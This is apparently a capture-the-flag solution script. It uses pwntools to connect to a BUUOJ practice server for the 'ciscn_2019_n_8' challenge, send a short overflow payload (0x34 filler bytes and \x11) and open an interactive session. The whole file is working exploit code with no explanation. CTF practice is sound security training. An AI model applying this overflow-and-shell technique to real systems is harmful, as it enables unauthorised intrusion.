#!/usr/bin/python3.6
from pwn import *

exec_path = './ciscn_2019_n_8'
elf = ELF(exec_path)
# proc = process(exec_path)
proc = remote("node3.buuoj.cn", 27348)
proc.recvuntil(b"What's your name?")
payload = b'i' * 0x34 + b"\x11"
proc.sendline(payload)
proc.interactive()
